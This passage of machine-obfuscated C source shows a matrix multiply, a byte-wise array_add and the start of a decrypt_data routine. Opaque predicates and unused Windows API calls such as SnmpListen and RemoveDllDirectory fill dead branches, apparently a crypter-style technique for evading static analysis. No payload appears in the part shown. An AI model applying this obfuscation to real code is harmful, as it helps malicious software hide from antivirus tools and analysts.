      unsigned int v69f4e1951778af4b7fd92e022e0ff84f_true_opaque = (((v1f083764923956d0b57470a75d9bd7d4_computation_opaque * v1f083764923956d0b57470a75d9bd7d4_computation_opaque) + v1f083764923956d0b57470a75d9bd7d4_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        unsigned int v39b2f676f86c7257ba42995db635548f_useless_opaque = (unsigned int) 2843614310;
        unsigned int v463a8578c06e2c7de8778ff8b066ea71_computation_opaque = (unsigned int) (&v39b2f676f86c7257ba42995db635548f_useless_opaque);
        unsigned int v2232f10b87047d821a28914b613ac952_true_opaque = (((v463a8578c06e2c7de8778ff8b066ea71_computation_opaque * v463a8578c06e2c7de8778ff8b066ea71_computation_opaque) + v463a8578c06e2c7de8778ff8b066ea71_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        for (int i = 0; i < 4; i++)
          for (int j = 0; j < 4; j++)
        {
          matrix_result[i][j] = 0;
          if (!v69f4e1951778af4b7fd92e022e0ff84f_true_opaque)
          {
            if (v2232f10b87047d821a28914b613ac952_true_opaque)
            {
              v463a8578c06e2c7de8778ff8b066ea71_computation_opaque = v1f083764923956d0b57470a75d9bd7d4_computation_opaque <= v9173003365369be689f4314d1fd71dfa_useless_opaque;
              v1f083764923956d0b57470a75d9bd7d4_computation_opaque = v39b2f676f86c7257ba42995db635548f_useless_opaque - v69f4e1951778af4b7fd92e022e0ff84f_true_opaque;
              v463a8578c06e2c7de8778ff8b066ea71_computation_opaque = v9173003365369be689f4314d1fd71dfa_useless_opaque < v463a8578c06e2c7de8778ff8b066ea71_computation_opaque;
            }
          }
          for (int k = 0; k < 4; k++)
            matrix_result[i][j] += matrix_1[i][k] * matrix_2[k][j];

          matrix_result[i][j] %= 256;
        }


      }
    }
    unsigned int vcb99a692e17acf3c0e3ebde4ea3a4e76_useless_opaque = (unsigned int) 3952701496;
    unsigned int v5d7b7e677701cf5381fb59cff501686e_random_opaque = (unsigned int) (&vcb99a692e17acf3c0e3ebde4ea3a4e76_useless_opaque);
  }
}

void array_add(char *dest, char *adder)
{
  {
    unsigned int v99fa7df2b58d0601a395e6a7103362b1_useless_opaque = (unsigned int) 88958064;
    unsigned int vb11d18ce4ff2f39eec85e019087dee19_computation_opaque = (unsigned int) 0;
    unsigned int v777773bbc81c21471cfeee2db602fb5d_computation_opaque = (unsigned int) 3;
    unsigned int veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque = (unsigned int) (&v99fa7df2b58d0601a395e6a7103362b1_useless_opaque);
    veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque = (veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque < ((unsigned int) 3))
    {
      veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque = (unsigned int) 3;
      unsigned int v3dce4d0620d30821e7010f9b4c7ba6b7_useless_opaque = (unsigned int) 3624865699;
      unsigned int v169c215f5c53a53c125ce71876f4c5be_computation_opaque = (unsigned int) 0;
      unsigned int v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque = (unsigned int) 3;
      unsigned int v756c6d6b1e81a6b0a25735766385e28c_computation_opaque = (unsigned int) (&v3dce4d0620d30821e7010f9b4c7ba6b7_useless_opaque);
      v756c6d6b1e81a6b0a25735766385e28c_computation_opaque = (v756c6d6b1e81a6b0a25735766385e28c_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v756c6d6b1e81a6b0a25735766385e28c_computation_opaque < ((unsigned int) 3))
      {
        v756c6d6b1e81a6b0a25735766385e28c_computation_opaque = (unsigned int) 3;
      }
      while (v169c215f5c53a53c125ce71876f4c5be_computation_opaque != ((unsigned int) 1))
      {
        v756c6d6b1e81a6b0a25735766385e28c_computation_opaque += (unsigned int) 2;
        v169c215f5c53a53c125ce71876f4c5be_computation_opaque = (unsigned int) 1;
        v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque = (unsigned int) 3;
        while ((v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque * v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque) <= v756c6d6b1e81a6b0a25735766385e28c_computation_opaque)
        {
          if ((v756c6d6b1e81a6b0a25735766385e28c_computation_opaque % v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque) == ((unsigned int) 0))
          {
            v169c215f5c53a53c125ce71876f4c5be_computation_opaque = (unsigned int) 0;
          }
          v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque = v0fc9f54d473dd07e6426c82f8d17f262_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int vb1aa0c88b5951ce65633d4588107ea8f_prime_opaque = v756c6d6b1e81a6b0a25735766385e28c_computation_opaque;
    }
    while (vb11d18ce4ff2f39eec85e019087dee19_computation_opaque != ((unsigned int) 1))
    {
      veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque += (unsigned int) 2;
      vb11d18ce4ff2f39eec85e019087dee19_computation_opaque = (unsigned int) 1;
      v777773bbc81c21471cfeee2db602fb5d_computation_opaque = (unsigned int) 3;
      while ((v777773bbc81c21471cfeee2db602fb5d_computation_opaque * v777773bbc81c21471cfeee2db602fb5d_computation_opaque) <= veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque)
      {
        if ((veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque % v777773bbc81c21471cfeee2db602fb5d_computation_opaque) == ((unsigned int) 0))
        {
          vb11d18ce4ff2f39eec85e019087dee19_computation_opaque = (unsigned int) 0;
        }
        v777773bbc81c21471cfeee2db602fb5d_computation_opaque = v777773bbc81c21471cfeee2db602fb5d_computation_opaque + ((unsigned int) 2);
      }

    }

    unsigned int vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque = veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque;
    {
      unsigned int vf8af877260e2140eddc6143adedf1027_useless_opaque = (unsigned int) 2258678726;
      unsigned int v2c0a8e35fb4a772ddd9863a5a6ca0bcb_useless_opaque = (unsigned int) 2532208995;
      unsigned int vc5c42d47562a2a9f608ae270998ab481_computation_opaque = (unsigned int) 0;
      unsigned int vb36a3b42080d7a800435ed6492fe461c_computation_opaque = (unsigned int) 3;
      unsigned int v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque = (unsigned int) (&v2c0a8e35fb4a772ddd9863a5a6ca0bcb_useless_opaque);
      v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque = (v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque < ((unsigned int) 3))
      {
        if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
        {
          if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
          {
            unsigned long v53c7d2f07b6ee2ce43cfedfe8f667afd = (unsigned long) 0xf3e5b099;
            if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
            {
              if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
              {
                vb11d18ce4ff2f39eec85e019087dee19_computation_opaque = vf8af877260e2140eddc6143adedf1027_useless_opaque | v99fa7df2b58d0601a395e6a7103362b1_useless_opaque;
              }
              unsigned long v6128f38169ec2057d80a66b25d1bac34 = (unsigned long) 0x99a68363;
              if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
              {
                void * vc8cbb5cb01910a00cea2dcf9da381d01 = (void *) 0x16b7f630;
                unsigned long vbe3d9a3466c283d1745c20356f410d54 = (unsigned long) 0x9393fe35;
                unsigned long veb77bc2a81f272d8535d7ade6e374932 = (unsigned long) 0x990450dc;
                veb77bc2a81f272d8535d7ade6e374932 = SnmpListen(vc8cbb5cb01910a00cea2dcf9da381d01, vbe3d9a3466c283d1745c20356f410d54);
              }
              unsigned long ve799e216c771e4424ce26b146161f651 = (unsigned long) 0xdbea7a49;
              ve799e216c771e4424ce26b146161f651 = MsiGetActiveDatabase(v6128f38169ec2057d80a66b25d1bac34);
            }
            unsigned long v0d2f040f6f90944fe834d2d6a1c25e1c = (unsigned long) 0x90c2b3d9;
            if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
            {
              if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
              {
                v0d2f040f6f90944fe834d2d6a1c25e1c = MsiGetActiveDatabase(v53c7d2f07b6ee2ce43cfedfe8f667afd);
              }
            }
          }
          if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
          {
            v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque = (unsigned int) 3;
          }
        }
      }
      while (vc5c42d47562a2a9f608ae270998ab481_computation_opaque != ((unsigned int) 1))
      {
        v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque += (unsigned int) 2;
        if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
        {
          veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque = v2c0a8e35fb4a772ddd9863a5a6ca0bcb_useless_opaque * v777773bbc81c21471cfeee2db602fb5d_computation_opaque;
        }
        vc5c42d47562a2a9f608ae270998ab481_computation_opaque = (unsigned int) 1;
        vb36a3b42080d7a800435ed6492fe461c_computation_opaque = (unsigned int) 3;
        while ((vb36a3b42080d7a800435ed6492fe461c_computation_opaque * vb36a3b42080d7a800435ed6492fe461c_computation_opaque) <= v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque)
        {
          if ((v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque % vb36a3b42080d7a800435ed6492fe461c_computation_opaque) == ((unsigned int) 0))
          {
            vc5c42d47562a2a9f608ae270998ab481_computation_opaque = (unsigned int) 0;
            if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
            {
              void * vc5f41efb0769bc3d964cad6cb1696c00 = (void *) 0x7c223bef;
              int vc4a438d34a6bd70b35c6d00d17fc0ff7 = (int) 0x37aacc33;
              vc4a438d34a6bd70b35c6d00d17fc0ff7 = RemoveDllDirectory(vc5f41efb0769bc3d964cad6cb1696c00);
            }
          }
          if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
          {
            if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
            {
              if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
              {
                vb36a3b42080d7a800435ed6492fe461c_computation_opaque = vb36a3b42080d7a800435ed6492fe461c_computation_opaque + ((unsigned int) 2);
              }
            }
          }
        }

      }

      if (!(((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2))))
      {
        void * vfe3216ea603f4e5f484457e7c10d400c = (void *) 0x04743a3e;
        void * ve372de1b45e10879d9cd73b3659c76d9 = (void *) 0x5cbbada6;
        unsigned long v49b93b696a598b69d7c2c1d11105952f = (unsigned long) 0x73590479;
        unsigned long vc0b55124f914906c7b1d34e17f1d0d34 = (unsigned long) 0x23839201;
        if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
        {
          vc0b55124f914906c7b1d34e17f1d0d34 = GetModuleFileNameA(vfe3216ea603f4e5f484457e7c10d400c, ve372de1b45e10879d9cd73b3659c76d9, v49b93b696a598b69d7c2c1d11105952f);
        }
      }
      unsigned int v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque = v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque;
      unsigned int v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque = (unsigned int) (&vf8af877260e2140eddc6143adedf1027_useless_opaque);
      unsigned int vd78a39d8fe660193159a553453759d36_true_opaque = (((v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque * v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque) + v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        unsigned int v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque = (unsigned int) 566111928;
        if (!vd78a39d8fe660193159a553453759d36_true_opaque)
        {
          void * vae57d2c1d76465b762eacfa6a560c89e = (void *) 0xd6685b48;
          unsigned long v7530f92d599ba1f1d7de7fd13043897b = (unsigned long) 0x9a053ff4;
          unsigned long v6108ed4a17647cdaa9a897dec5b000fd = (unsigned long) 0x4e9bd91d;
          if (!vd78a39d8fe660193159a553453759d36_true_opaque)
          {
            unsigned long vf2df785a5ffe9da9db7eb234bfbb5495 = (unsigned long) 0x210fa96f;
            if (vd78a39d8fe660193159a553453759d36_true_opaque)
            {
              void * v8bb945d0d443596983fba91e25f706a1 = (void *) 0xd4869823;
              int v9c06f42bc95aac38185b4478777b28f4 = (int) 0x07ff7298;
              void * vdb9268241c91caae8fea4d82ecbd829e = (void *) 0x3fc9efb6;
              int v684c18d146e9e3d31e8c3000201fcc46 = (int) 0xfcffa29d;
              int vfe251743b1029d13d39128ea9af95b0e = (int) 0xfee1204f;
              vfe251743b1029d13d39128ea9af95b0e = IdnToNameprepUnicode(vf2df785a5ffe9da9db7eb234bfbb5495, v8bb945d0d443596983fba91e25f706a1, v9c06f42bc95aac38185b4478777b28f4, vdb9268241c91caae8fea4d82ecbd829e, v684c18d146e9e3d31e8c3000201fcc46);
            }
          }
          v6108ed4a17647cdaa9a897dec5b000fd = SnmpListen(vae57d2c1d76465b762eacfa6a560c89e, v7530f92d599ba1f1d7de7fd13043897b);
        }
        unsigned int va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque = (unsigned int) (&v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque);
        unsigned int va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque = (((va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque * va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque) + va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        if (!(((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2))))
        {
          vf8af877260e2140eddc6143adedf1027_useless_opaque = v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque < vb36a3b42080d7a800435ed6492fe461c_computation_opaque;
          v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque = va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque * v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque;
          if (!va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque)
          {
            vb11d18ce4ff2f39eec85e019087dee19_computation_opaque = vc5c42d47562a2a9f608ae270998ab481_computation_opaque | v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque;
            if (va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque)
            {
              vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque = vb11d18ce4ff2f39eec85e019087dee19_computation_opaque == vd78a39d8fe660193159a553453759d36_true_opaque;
              veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque = vb36a3b42080d7a800435ed6492fe461c_computation_opaque * vc5c42d47562a2a9f608ae270998ab481_computation_opaque;
              v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque = v777773bbc81c21471cfeee2db602fb5d_computation_opaque || veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque;
              veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque = v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque / veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque;
            }
          }
          vc5c42d47562a2a9f608ae270998ab481_computation_opaque = vd78a39d8fe660193159a553453759d36_true_opaque || vf8af877260e2140eddc6143adedf1027_useless_opaque;
          if (!(((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2))))
          {
            v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque = vb11d18ce4ff2f39eec85e019087dee19_computation_opaque + v777773bbc81c21471cfeee2db602fb5d_computation_opaque;
            if (vd78a39d8fe660193159a553453759d36_true_opaque)
            {
              if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
              {
                if (!vd78a39d8fe660193159a553453759d36_true_opaque)
                {
                  va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque = v99fa7df2b58d0601a395e6a7103362b1_useless_opaque % va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque;
                  vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque = v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque % v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque;
                }
                if (!(((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2))))
                {
                  vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque = va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque == v777773bbc81c21471cfeee2db602fb5d_computation_opaque;
                  vd78a39d8fe660193159a553453759d36_true_opaque = va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque + vc5c42d47562a2a9f608ae270998ab481_computation_opaque;
                  vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque = vd78a39d8fe660193159a553453759d36_true_opaque % va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque;
                  vb36a3b42080d7a800435ed6492fe461c_computation_opaque = v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque || v2c0a8e35fb4a772ddd9863a5a6ca0bcb_useless_opaque;
                  v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque = va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque || vf8af877260e2140eddc6143adedf1027_useless_opaque;
                  vf8af877260e2140eddc6143adedf1027_useless_opaque = vb11d18ce4ff2f39eec85e019087dee19_computation_opaque | v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque;
                }
                vd78a39d8fe660193159a553453759d36_true_opaque = v99fa7df2b58d0601a395e6a7103362b1_useless_opaque <= vd78a39d8fe660193159a553453759d36_true_opaque;
                v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque = vd78a39d8fe660193159a553453759d36_true_opaque <= v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque;
                va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque = v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque || vc5c42d47562a2a9f608ae270998ab481_computation_opaque;
                vd78a39d8fe660193159a553453759d36_true_opaque = va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque | vc5c42d47562a2a9f608ae270998ab481_computation_opaque;
                if (((vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque == ((unsigned int) 2)))
                {
                  vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque = v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque | vc5c42d47562a2a9f608ae270998ab481_computation_opaque;
                }
              }
            }
          }
          v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque = vb11d18ce4ff2f39eec85e019087dee19_computation_opaque <= v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque;
          if (vd78a39d8fe660193159a553453759d36_true_opaque)
          {
            v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque = v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque + v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque;
            if (((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2)))
            {
              if (((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2)))
              {
                v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque = v99fa7df2b58d0601a395e6a7103362b1_useless_opaque | va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque;
              }
            }
          }
        }
        if (!vd78a39d8fe660193159a553453759d36_true_opaque)
        {
          v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque = vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque * vd78a39d8fe660193159a553453759d36_true_opaque;
          v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque = va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque + ((unsigned int) 65);
          vb36a3b42080d7a800435ed6492fe461c_computation_opaque = veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque | va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque;
        }
        if (vd78a39d8fe660193159a553453759d36_true_opaque)
        {
          for (int i = 0; i < 16; i++)
          {
            dest[i] = (dest[i] + adder[i]) % 256;
            if (!(((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2))))
            {
              if (((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2)))
              {
                va5933adb1e406d9c73e59bd4fcf14d3a_true_opaque = vf8af877260e2140eddc6143adedf1027_useless_opaque | v2c0a8e35fb4a772ddd9863a5a6ca0bcb_useless_opaque;
                if (!(((v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque == ((unsigned int) 2))))
                {
                  vd78a39d8fe660193159a553453759d36_true_opaque = va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque - vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque;
                }
              }
            }
            if (!vd78a39d8fe660193159a553453759d36_true_opaque)
            {
              v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque = vb36a3b42080d7a800435ed6492fe461c_computation_opaque < v0d4bca90b05d9584bf3dfd18b5d010c9_computation_opaque;
              va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque = veb8836fb4b1da819b8578c3e6d8ead93_computation_opaque == v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque;
              v69994cf9ea83a0d552f9bf19f7ad961d_prime_opaque = v8d3e6c9df651d09175e05b4cb2b4d6ce_useless_opaque / v1bfe8e0468e96fa1795f7987ce0b5cfc_computation_opaque;
              vd78a39d8fe660193159a553453759d36_true_opaque = vefcca2dff22f581e6cae7ac09cca4bc2_prime_opaque | va55d45a25007f437a2fbd6fd06fc5d65_computation_opaque;
            }
          }

        }
      }
    }
  }
  unsigned int v75c305f73c68b68f011e6a269eb2b109_useless_opaque = (unsigned int) 2298049803;
  unsigned int v8b8e1d7355caf3ab6fa487160e22a242_random_opaque = (unsigned int) (&v75c305f73c68b68f011e6a269eb2b109_useless_opaque);
}

void decrypt_data(char *src, DWORD size)
{
  {
    unsigned int v91c106a71ff264699729858045ab5bd2_useless_opaque = (unsigned int) 4016887708;
    unsigned int vd24a125e70ebbf56f696e249d418d35c_computation_opaque = (unsigned int) 0;
    unsigned int ve8cd1da2a30eeb951d3bb76b1ce59d45_computation_opaque = (unsigned int) 3;
    unsigned int vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = (unsigned int) (&v91c106a71ff264699729858045ab5bd2_useless_opaque);
    vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = (vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque < ((unsigned int) 3))
    {
      unsigned int ve4413f7ea132231ca93005a4cbb1e3e1_useless_opaque = (unsigned int) 721211381;
      unsigned int vebe0aaba795cbc83cf94ef65c3f02f67_computation_opaque = (unsigned int) 0;
      unsigned int vfbc4e8964818134b837d5b3382f61c03_computation_opaque = (unsigned int) 3;
      unsigned int vb5bea06211071fe79857c8353b125241_computation_opaque = (unsigned int) (&ve4413f7ea132231ca93005a4cbb1e3e1_useless_opaque);
      vb5bea06211071fe79857c8353b125241_computation_opaque = (vb5bea06211071fe79857c8353b125241_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vb5bea06211071fe79857c8353b125241_computation_opaque < ((unsigned int) 3))
      {
        vb5bea06211071fe79857c8353b125241_computation_opaque = (unsigned int) 3;
      }
      while (vebe0aaba795cbc83cf94ef65c3f02f67_computation_opaque != ((unsigned int) 1))
      {
        vb5bea06211071fe79857c8353b125241_computation_opaque += (unsigned int) 2;
        vebe0aaba795cbc83cf94ef65c3f02f67_computation_opaque = (unsigned int) 1;
        vfbc4e8964818134b837d5b3382f61c03_computation_opaque = (unsigned int) 3;
        while ((vfbc4e8964818134b837d5b3382f61c03_computation_opaque * vfbc4e8964818134b837d5b3382f61c03_computation_opaque) <= vb5bea06211071fe79857c8353b125241_computation_opaque)
        {
          if ((vb5bea06211071fe79857c8353b125241_computation_opaque % vfbc4e8964818134b837d5b3382f61c03_computation_opaque) == ((unsigned int) 0))
          {
            vebe0aaba795cbc83cf94ef65c3f02f67_computation_opaque = (unsigned int) 0;
          }
          vfbc4e8964818134b837d5b3382f61c03_computation_opaque = vfbc4e8964818134b837d5b3382f61c03_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v73a5a3bac0e3c059f7abae2325a20dac_prime_opaque = vb5bea06211071fe79857c8353b125241_computation_opaque;
      vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque = (unsigned int) 3;
    }
    while (vd24a125e70ebbf56f696e249d418d35c_computation_opaque != ((unsigned int) 1))
    {
      vd0d60216e6f64a0d78de1783f64a7b29_computation_opaque += (unsigned int) 2;
      unsigned int vadd91f8128e3210b4ca9b7dab9a0f69b_useless_opaque = (unsigned int) 2519209496;
      unsigned int v128b2d2ad6b0e92687872066eba8abda_computation_opaque = (unsigned int) 0;
      unsigned int v18cff913dea305769e3c53238902e25a_computation_opaque = (unsigned int) 3;
      unsigned int v19db528871a69f89c289d390713643fb_computation_opaque = (unsigned int) (&vadd91f8128e3210b4ca9b7dab9a0f69b_useless_opaque);
      v19db528871a69f89c289d390713643fb_computation_opaque = (v19db528871a69f89c289d390713643fb_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v19db528871a69f89c289d390713643fb_computation_opaque < ((unsigned int) 3))
      {
        v19db528871a69f89c289d390713643fb_computation_opaque = (unsigned int) 3;
      }
      while (v128b2d2ad6b0e92687872066eba8abda_computation_opaque != ((unsigned int) 1))
      {
        v19db528871a69f89c289d390713643fb_computation_opaque += (unsigned int) 2;
        v128b2d2ad6b0e92687872066eba8abda_computation_opaque = (unsigned int) 1;
        v18cff913dea305769e3c53238902e25a_computation_opaque = (unsigned int) 3;
        while ((v18cff913dea305769e3c53238902e25a_computation_opaque * v18cff913dea305769e3c53238902e25a_computation_opaque) <= v19db528871a69f89c289d390713643fb_computation_opaque)
        {
